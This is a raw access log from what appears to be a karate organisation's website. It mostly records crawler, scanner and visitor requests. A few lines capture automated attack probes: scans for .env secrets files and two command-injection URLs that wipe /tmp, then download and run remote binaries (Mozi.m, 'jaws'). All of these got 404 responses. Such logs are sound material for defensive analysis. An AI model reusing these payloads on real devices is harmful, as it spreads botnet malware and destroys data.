::ffff:82.193.104.168 - - [10/Aug/2022:04:25:52 +0000] "HEAD / HTTP/1.1" 200 58071 "-" "Mozilla/5.0 (compatible; Domains Project/1.3.7; +https://domainsproject.org)"
::ffff:82.193.104.168 - - [10/Aug/2022:04:25:56 +0000] "GET /robots.txt HTTP/1.1" 404 149 "-" "Mozilla/5.0 (compatible; Domains Project/1.3.7; +https://domainsproject.org)"
::ffff:82.193.104.168 - - [10/Aug/2022:04:26:00 +0000] "GET / HTTP/1.1" 200 58071 "-" "Mozilla/5.0 (compatible; Domains Project/1.3.7; +https://domainsproject.org)"
::ffff:82.193.104.168 - - [10/Aug/2022:04:26:07 +0000] "GET / HTTP/1.1" 200 58071 "-" "Mozilla/5.0 (compatible; Domains Project/1.3.7; +https://domainsproject.org)"
::ffff:82.193.104.168 - - [10/Aug/2022:04:26:07 +0000] "GET /events HTTP/1.1" 200 8612 "-" "Mozilla/5.0 (compatible; Domains Project/1.3.7; +https://domainsproject.org)"
::ffff:82.193.104.168 - - [10/Aug/2022:04:26:10 +0000] "GET /contact HTTP/1.1" 200 10017 "-" "Mozilla/5.0 (compatible; Domains Project/1.3.7; +https://domainsproject.org)"
::ffff:82.193.104.168 - - [10/Aug/2022:04:26:13 +0000] "GET /contact?s=1&ss=0 HTTP/1.1" 200 9997 "-" "Mozilla/5.0 (compatible; Domains Project/1.3.7; +https://domainsproject.org)"
::ffff:82.193.104.168 - - [10/Aug/2022:04:26:14 +0000] "GET /contact?s=1&ss=1 HTTP/1.1" 200 9997 "-" "Mozilla/5.0 (compatible; Domains Project/1.3.7; +https://domainsproject.org)"
::ffff:82.193.104.168 - - [10/Aug/2022:04:26:15 +0000] "GET /contact?s=1&ss=2 HTTP/1.1" 200 9997 "-" "Mozilla/5.0 (compatible; Domains Project/1.3.7; +https://domainsproject.org)"
::ffff:82.193.104.168 - - [10/Aug/2022:04:26:16 +0000] "GET /contact?s=1&ss=3 HTTP/1.1" 200 9997 "-" "Mozilla/5.0 (compatible; Domains Project/1.3.7; +https://domainsproject.org)"
::ffff:82.193.104.168 - - [10/Aug/2022:04:26:16 +0000] "GET /joinemail?type=promotions HTTP/1.1" 200 8841 "-" "Mozilla/5.0 (compatible; Domains Project/1.3.7; +https://domainsproject.org)"
::ffff:51.222.253.12 - - [10/Aug/2022:04:26:16 +0000] "GET /joinemail?type=specialclasses HTTP/1.1" 200 8958 "-" "Mozilla/5.0 (compatible; AhrefsBot/7.0; +http://ahrefs.com/robot/)"
::ffff:82.193.104.168 - - [10/Aug/2022:04:26:17 +0000] "GET /contact?s=1&ss=4 HTTP/1.1" 200 9997 "-" "Mozilla/5.0 (compatible; Domains Project/1.3.7; +https://domainsproject.org)"
::ffff:82.193.104.168 - - [10/Aug/2022:04:26:18 +0000] "GET /contact?s=1&ss=5 HTTP/1.1" 200 9997 "-" "Mozilla/5.0 (compatible; Domains Project/1.3.7; +https://domainsproject.org)"
::ffff:82.193.104.168 - - [10/Aug/2022:04:26:19 +0000] "GET /joinemail?type=tournaments HTTP/1.1" 200 8829 "-" "Mozilla/5.0 (compatible; Domains Project/1.3.7; +https://domainsproject.org)"
::ffff:82.193.104.168 - - [10/Aug/2022:04:26:21 +0000] "GET /contact?s=1&ss=7 HTTP/1.1" 200 9997 "-" "Mozilla/5.0 (compatible; Domains Project/1.3.7; +https://domainsproject.org)"
::ffff:82.193.104.168 - - [10/Aug/2022:04:26:21 +0000] "GET /contact?s=1&ss=6 HTTP/1.1" 200 9997 "-" "Mozilla/5.0 (compatible; Domains Project/1.3.7; +https://domainsproject.org)"
::ffff:82.193.104.168 - - [10/Aug/2022:04:26:22 +0000] "GET /contact?s=1&ss=8 HTTP/1.1" 200 9997 "-" "Mozilla/5.0 (compatible; Domains Project/1.3.7; +https://domainsproject.org)"
::ffff:82.193.104.168 - - [10/Aug/2022:04:26:23 +0000] "GET /contact?s=1&ss=9 HTTP/1.1" 200 9997 "-" "Mozilla/5.0 (compatible; Domains Project/1.3.7; +https://domainsproject.org)"
::ffff:82.193.104.168 - - [10/Aug/2022:04:26:24 +0000] "GET /contact?s=1&ss=10 HTTP/1.1" 200 9997 "-" "Mozilla/5.0 (compatible; Domains Project/1.3.7; +https://domainsproject.org)"
::ffff:82.193.104.168 - - [10/Aug/2022:04:26:24 +0000] "GET /schools HTTP/1.1" 200 96626 "-" "Mozilla/5.0 (compatible; Domains Project/1.3.7; +https://domainsproject.org)"
::ffff:82.193.104.168 - - [10/Aug/2022:04:26:26 +0000] "GET /contact?s=1&ss=11 HTTP/1.1" 200 9997 "-" "Mozilla/5.0 (compatible; Domains Project/1.3.7; +https://domainsproject.org)"
::ffff:82.193.104.168 - - [10/Aug/2022:04:26:40 +0000] "GET /resources HTTP/1.1" 200 194907 "-" "Mozilla/5.0 (compatible; Domains Project/1.3.7; +https://domainsproject.org)"
::ffff:172.58.32.63 - - [10/Aug/2022:04:30:44 +0000] "GET /css/wadokikai.css HTTP/1.1" 304 - "http://wadokikai.org/" "Mozilla/5.0 (Linux; Android 9; SM-A102U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.0.0 Mobile Safari/537.36"
::ffff:172.58.32.63 - - [10/Aug/2022:04:30:44 +0000] "GET /js/common.js HTTP/1.1" 304 - "http://wadokikai.org/" "Mozilla/5.0 (Linux; Android 9; SM-A102U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.0.0 Mobile Safari/537.36"
::ffff:172.58.32.63 - - [10/Aug/2022:04:30:44 +0000] "GET /images/wkkpatch22_med.png HTTP/1.1" 304 - "http://wadokikai.org/" "Mozilla/5.0 (Linux; Android 9; SM-A102U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.0.0 Mobile Safari/537.36"
::ffff:172.58.32.63 - - [10/Aug/2022:04:30:44 +0000] "GET /images/promotions/20220728corpuz.jpg HTTP/1.1" 304 - "http://wadokikai.org/" "Mozilla/5.0 (Linux; Android 9; SM-A102U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.0.0 Mobile Safari/537.36"
::ffff:172.58.32.63 - - [10/Aug/2022:04:30:44 +0000] "GET /images/marin5thDan.jpeg HTTP/1.1" 304 - "http://wadokikai.org/" "Mozilla/5.0 (Linux; Android 9; SM-A102U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.0.0 Mobile Safari/537.36"
::ffff:172.58.32.63 - - [10/Aug/2022:04:30:45 +0000] "GET /images/schools/alamedakaratedomap.jpg HTTP/1.1" 304 - "http://wadokikai.org/" "Mozilla/5.0 (Linux; Android 9; SM-A102U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.0.0 Mobile Safari/537.36"
::ffff:172.58.32.63 - - [10/Aug/2022:04:30:45 +0000] "GET /images/schools/orindakaratedomap.jpg HTTP/1.1" 304 - "http://wadokikai.org/" "Mozilla/5.0 (Linux; Android 9; SM-A102U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.0.0 Mobile Safari/537.36"
::ffff:172.58.32.63 - - [10/Aug/2022:04:30:45 +0000] "GET /images/schools/dcakaratedomap.jpg HTTP/1.1" 304 - "http://wadokikai.org/" "Mozilla/5.0 (Linux; Android 9; SM-A102U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.0.0 Mobile Safari/537.36"
::ffff:172.58.32.63 - - [10/Aug/2022:04:30:45 +0000] "GET /images/schools/nunleykaratedomap.jpg HTTP/1.1" 304 - "http://wadokikai.org/" "Mozilla/5.0 (Linux; Android 9; SM-A102U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.0.0 Mobile Safari/537.36"
::ffff:172.58.32.63 - - [10/Aug/2022:04:30:45 +0000] "GET /images/schools/harborbaykaratedomap.jpg HTTP/1.1" 304 - "http://wadokikai.org/" "Mozilla/5.0 (Linux; Android 9; SM-A102U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.0.0 Mobile Safari/537.36"
::ffff:172.58.32.63 - - [10/Aug/2022:04:30:46 +0000] "GET /images/schools/corpuzkaratedomap.jpg HTTP/1.1" 304 - "http://wadokikai.org/" "Mozilla/5.0 (Linux; Android 9; SM-A102U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.0.0 Mobile Safari/537.36"
::ffff:172.58.32.63 - - [10/Aug/2022:04:30:46 +0000] "GET /images/schools/marinkaratedomap.jpg HTTP/1.1" 304 - "http://wadokikai.org/" "Mozilla/5.0 (Linux; Android 9; SM-A102U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.0.0 Mobile Safari/537.36"
::ffff:172.58.32.63 - - [10/Aug/2022:04:30:46 +0000] "GET /images/schools/earhartkaratedomap.jpg HTTP/1.1" 304 - "http://wadokikai.org/" "Mozilla/5.0 (Linux; Android 9; SM-A102U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.0.0 Mobile Safari/537.36"
::ffff:172.58.32.63 - - [10/Aug/2022:04:30:46 +0000] "GET /images/schools/martinezkaratedomap.jpg HTTP/1.1" 304 - "http://wadokikai.org/" "Mozilla/5.0 (Linux; Android 9; SM-A102U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.0.0 Mobile Safari/537.36"
::ffff:172.58.32.63 - - [10/Aug/2022:04:30:46 +0000] "GET /images/dragon-trans.png HTTP/1.1" 304 - "http://wadokikai.org/" "Mozilla/5.0 (Linux; Android 9; SM-A102U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.0.0 Mobile Safari/537.36"
::ffff:172.58.32.63 - - [10/Aug/2022:04:30:46 +0000] "GET /images/schools/manzanitakaratedomap.jpg HTTP/1.1" 304 - "http://wadokikai.org/" "Mozilla/5.0 (Linux; Android 9; SM-A102U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.0.0 Mobile Safari/537.36"
::ffff:172.58.32.63 - - [10/Aug/2022:04:30:49 +0000] "GET /images/tiger.bmp HTTP/1.1" 304 - "http://wadokikai.org/" "Mozilla/5.0 (Linux; Android 9; SM-A102U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.0.0 Mobile Safari/537.36"
::ffff:172.58.32.63 - - [10/Aug/2022:04:30:53 +0000] "GET /images/wadokikai%20kanji.jpg HTTP/1.1" 304 - "http://wadokikai.org/" "Mozilla/5.0 (Linux; Android 9; SM-A102U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.0.0 Mobile Safari/537.36"
::ffff:172.58.32.63 - - [10/Aug/2022:04:31:49 +0000] "GET /images/tiger.bmp HTTP/1.1" 304 - "http://wadokikai.org/" "Mozilla/5.0 (Linux; Android 9; SM-A102U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.0.0 Mobile Safari/537.36"
::ffff:172.58.32.63 - - [10/Aug/2022:04:31:53 +0000] "GET /images/wadokikai%20kanji.jpg HTTP/1.1" 304 - "http://wadokikai.org/" "Mozilla/5.0 (Linux; Android 9; SM-A102U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.0.0 Mobile Safari/537.36"
::ffff:172.58.32.63 - - [10/Aug/2022:04:32:45 +0000] "GET /images/dragon-trans.png HTTP/1.1" 304 - "http://wadokikai.org/" "Mozilla/5.0 (Linux; Android 9; SM-A102U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.0.0 Mobile Safari/537.36"
::ffff:172.58.32.63 - - [10/Aug/2022:04:32:49 +0000] "GET /images/tiger.bmp HTTP/1.1" 304 - "http://wadokikai.org/" "Mozilla/5.0 (Linux; Android 9; SM-A102U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.0.0 Mobile Safari/537.36"
::ffff:172.58.32.63 - - [10/Aug/2022:04:33:45 +0000] "GET /images/dragon-trans.png HTTP/1.1" 304 - "http://wadokikai.org/" "Mozilla/5.0 (Linux; Android 9; SM-A102U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.0.0 Mobile Safari/537.36"
::ffff:172.58.32.63 - - [10/Aug/2022:04:33:49 +0000] "GET /images/tiger.bmp HTTP/1.1" 304 - "http://wadokikai.org/" "Mozilla/5.0 (Linux; Android 9; SM-A102U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.0.0 Mobile Safari/537.36"
::ffff:198.235.24.131 - - [10/Aug/2022:04:34:29 +0000] "GET / HTTP/1.0" 200 58071 "-" "Expanse, a Palo Alto Networks company, searches across the global IPv4 space multiple times per day to identify customers&#39; presences on the Internet. If you would like to be excluded from our scans, please send IP addresses/domains to: scaninfo@paloaltonetworks.com"
::ffff:172.58.32.63 - - [10/Aug/2022:04:35:37 +0000] "GET /images/tiger.bmp HTTP/1.1" 304 - "http://wadokikai.org/" "Mozilla/5.0 (Linux; Android 9; SM-A102U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.0.0 Mobile Safari/537.36"
::ffff:172.58.32.63 - - [10/Aug/2022:04:35:41 +0000] "GET /images/wadokikai%20kanji.jpg HTTP/1.1" 304 - "http://wadokikai.org/" "Mozilla/5.0 (Linux; Android 9; SM-A102U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.0.0 Mobile Safari/537.36"
::ffff:42.83.147.34 - - [10/Aug/2022:04:36:05 +0000] "GET / HTTP/1.1" 200 58071 "-" "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko)Chrome/74.0.3729.169 Safari/537.36"
::ffff:185.254.196.115 - - [10/Aug/2022:04:38:54 +0000] "GET /.env HTTP/1.1" 404 143 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
::ffff:185.254.196.115 - - [10/Aug/2022:04:38:54 +0000] "POST / HTTP/1.1" 404 140 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
::ffff:172.105.77.209 - - [10/Aug/2022:04:43:15 +0000] "GET /0bef HTTP/1.0" 404 143 "-" "-"
::ffff:185.196.220.70 - - [10/Aug/2022:04:47:31 +0000] "GET / HTTP/1.1" 200 58071 "-" "Linux Gnu (cow)"
::ffff:20.191.45.212 - - [10/Aug/2022:04:56:10 +0000] "GET / HTTP/1.1" 200 58071 "http://wadokikai.org/" "Mozilla/5.0 (compatible; DuckDuckGo-Favicons-Bot/1.0; +http://duckduckgo.com)"
::ffff:20.191.45.212 - - [10/Aug/2022:04:56:10 +0000] "GET /images/favicon.ico HTTP/1.1" 200 3638 "http://wadokikai.org/images/favicon.ico" "Mozilla/5.0 (compatible; DuckDuckGo-Favicons-Bot/1.0; +http://duckduckgo.com)"
::ffff:198.235.24.14 - - [10/Aug/2022:05:02:26 +0000] "GET / HTTP/1.1" 200 58071 "-" "Expanse, a Palo Alto Networks company, searches across the global IPv4 space multiple times per day to identify customers&#39; presences on the Internet. If you would like to be excluded from our scans, please send IP addresses/domains to: scaninfo@paloaltonetworks.com"
::ffff:109.237.103.9 - - [10/Aug/2022:05:03:30 +0000] "GET /.env HTTP/1.1" 404 143 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
::ffff:20.14.99.78 - - [10/Aug/2022:05:23:15 +0000] "GET /.env HTTP/1.1" 404 143 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
::ffff:20.14.99.78 - - [10/Aug/2022:05:23:15 +0000] "POST / HTTP/1.1" 404 140 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
::ffff:36.44.147.15 - - [10/Aug/2022:05:24:03 +0000] "GET /setup.cgi?next_file=netgear.cfg&todo=syscmd&cmd=rm+-rf+/tmp/*;wget+http://192.168.1.1:8088/Mozi.m+-O+/tmp/netgear;sh+netgear&curpath=/&currentsetting.htm=1 HTTP/1.0" 404 148 "-" "-"
::ffff:207.46.13.46 - - [10/Aug/2022:05:29:36 +0000] "GET / HTTP/1.1" 200 58071 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
::ffff:66.249.79.229 - - [10/Aug/2022:05:35:00 +0000] "GET /robots.txt HTTP/1.1" 404 149 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
::ffff:66.249.79.231 - - [10/Aug/2022:05:35:00 +0000] "GET /ads.txt HTTP/1.1" 404 146 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
::ffff:51.222.253.11 - - [10/Aug/2022:05:36:25 +0000] "GET /contact?s=1&ss=10 HTTP/1.1" 200 9997 "-" "Mozilla/5.0 (compatible; AhrefsBot/7.0; +http://ahrefs.com/robot/)"
::ffff:185.180.143.71 - - [10/Aug/2022:05:40:06 +0000] "GET / HTTP/1.1" 200 58071 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36"
::ffff:185.180.143.71 - - [10/Aug/2022:05:40:06 +0000] "GET /webfig/ HTTP/1.1" 404 146 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36"
::ffff:49.12.131.247 - - [10/Aug/2022:05:40:32 +0000] "GET /robots.txt HTTP/1.1" 404 149 "-" "Mozilla/5.0 (compatible; BLEXBot/1.0; +http://webmeup-crawler.com/)"
::ffff:49.12.131.247 - - [10/Aug/2022:05:40:34 +0000] "GET /sitemap HTTP/1.1" 404 146 "-" "Mozilla/5.0 (compatible; BLEXBot/1.0; +http://webmeup-crawler.com/)"
::ffff:49.12.131.247 - - [10/Aug/2022:05:40:40 +0000] "GET /sitemap.txt HTTP/1.1" 404 150 "-" "Mozilla/5.0 (compatible; BLEXBot/1.0; +http://webmeup-crawler.com/)"
::ffff:135.125.244.48 - - [10/Aug/2022:05:45:37 +0000] "POST / HTTP/1.1" 404 140 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
::ffff:135.125.244.48 - - [10/Aug/2022:05:45:37 +0000] "GET /.env HTTP/1.1" 404 143 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
::ffff:103.134.251.106 - - [10/Aug/2022:05:45:54 +0000] "GET /shell?cd+/tmp;rm+-rf+*;wget+synss.cf/jaws;sh+/tmp/jaws HTTP/1.1" 404 144 "-" "Hello, world"
::ffff:207.46.13.67 - - [10/Aug/2022:05:56:38 +0000] "GET / HTTP/1.1" 200 58071 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
::ffff:185.254.196.115 - - [10/Aug/2022:06:07:54 +0000] "GET /.env HTTP/1.1" 404 143 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
::ffff:185.254.196.115 - - [10/Aug/2022:06:07:54 +0000] "POST / HTTP/1.1" 404 140 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
::ffff:116.203.244.49 - - [10/Aug/2022:06:12:33 +0000] "GET / HTTP/1.1" 200 58071 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.95 Safari/537.36"
::ffff:61.176.255.175 - - [10/Aug/2022:06:13:38 +0000] "GET / HTTP/1.1" 200 58071 "http://wadokikai.net/" "Mozilla/5.0 (Windows NT 6.3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/34.0.2754.37 Safari/537.36"
::ffff:61.176.255.175 - - [10/Aug/2022:06:13:44 +0000] "GET /contact HTTP/1.1" 200 10017 "http://wadokikai.net/" "Mozilla/5.0 (Windows NT 6.3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2896.80 Safari/537.36"
::ffff:135.125.217.54 - - [10/Aug/2022:06:26:32 +0000] "POST / HTTP/1.1" 404 140 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
::ffff:135.125.217.54 - - [10/Aug/2022:06:26:32 +0000] "GET /.env HTTP/1.1" 404 143 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
::ffff:157.55.39.140 - - [10/Aug/2022:06:27:48 +0000] "GET /docs/TwentyGuidingPriciplesOfKarate.pdf HTTP/1.1" 404 178 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
::ffff:212.102.57.168 - - [10/Aug/2022:06:44:19 +0000] "GET /contact.html HTTP/1.1" 404 151 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.3359.117 Safari/537.36"
::ffff:168.119.255.156 - - [10/Aug/2022:06:49:13 +0000] "GET / HTTP/1.1" 200 58071 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.95 Safari/537.36"
::ffff:51.222.253.20 - - [10/Aug/2022:07:02:56 +0000] "GET /contact?s=1&ss=11 HTTP/1.1" 200 9997 "-" "Mozilla/5.0 (compatible; AhrefsBot/7.0; +http://ahrefs.com/robot/)"
::ffff:108.202.243.61 - - [10/Aug/2022:07:12:10 +0000] "GET / HTTP/1.1" 200 58071 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36"
::ffff:108.202.243.61 - - [10/Aug/2022:07:12:11 +0000] "GET /css/wadokikai.css HTTP/1.1" 200 4337 "http://wadokikai.net/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36"
::ffff:108.202.243.61 - - [10/Aug/2022:07:12:11 +0000] "GET /js/common.js HTTP/1.1" 200 2255 "http://wadokikai.net/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36"
::ffff:108.202.243.61 - - [10/Aug/2022:07:12:11 +0000] "GET /images/wkkpatch22_med.png HTTP/1.1" 200 32301 "http://wadokikai.net/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36"
::ffff:108.202.243.61 - - [10/Aug/2022:07:12:11 +0000] "GET /images/schools/alamedakaratedomap.jpg HTTP/1.1" 200 38311 "http://wadokikai.net/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36"
::ffff:108.202.243.61 - - [10/Aug/2022:07:12:11 +0000] "GET /images/schools/dcakaratedomap.jpg HTTP/1.1" 200 35262 "http://wadokikai.net/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36"
::ffff:108.202.243.61 - - [10/Aug/2022:07:12:11 +0000] "GET /images/schools/orindakaratedomap.jpg HTTP/1.1" 200 34167 "http://wadokikai.net/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36"
::ffff:108.202.243.61 - - [10/Aug/2022:07:12:11 +0000] "GET /images/schools/harborbaykaratedomap.jpg HTTP/1.1" 200 37245 "http://wadokikai.net/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36"
::ffff:108.202.243.61 - - [10/Aug/2022:07:12:11 +0000] "GET /images/promotions/20220728corpuz.jpg HTTP/1.1" 200 108218 "http://wadokikai.net/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36"
::ffff:108.202.243.61 - - [10/Aug/2022:07:12:11 +0000] "GET /images/marin5thDan.jpeg HTTP/1.1" 200 105451 "http://wadokikai.net/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36"
::ffff:108.202.243.61 - - [10/Aug/2022:07:12:11 +0000] "GET /images/schools/corpuzkaratedomap.jpg HTTP/1.1" 200 36421 "http://wadokikai.net/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36"
::ffff:108.202.243.61 - - [10/Aug/2022:07:12:11 +0000] "GET /images/schools/nunleykaratedomap.jpg HTTP/1.1" 200 42667 "http://wadokikai.net/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36"
::ffff:108.202.243.61 - - [10/Aug/2022:07:12:11 +0000] "GET /images/schools/marinkaratedomap.jpg HTTP/1.1" 200 32400 "http://wadokikai.net/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36"
::ffff:108.202.243.61 - - [10/Aug/2022:07:12:11 +0000] "GET /images/schools/earhartkaratedomap.jpg HTTP/1.1" 200 41366 "http://wadokikai.net/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36"
::ffff:108.202.243.61 - - [10/Aug/2022:07:12:11 +0000] "GET /images/schools/martinezkaratedomap.jpg HTTP/1.1" 200 37724 "http://wadokikai.net/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36"
::ffff:108.202.243.61 - - [10/Aug/2022:07:12:11 +0000] "GET /images/schools/manzanitakaratedomap.jpg HTTP/1.1" 200 55402 "http://wadokikai.net/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36"
::ffff:108.202.243.61 - - [10/Aug/2022:07:12:11 +0000] "GET /images/dragon-trans.png HTTP/1.1" 200 85661 "http://wadokikai.net/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36"
::ffff:108.202.243.61 - - [10/Aug/2022:07:12:12 +0000] "GET /images/favicon.ico HTTP/1.1" 200 3638 "http://wadokikai.net/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36"
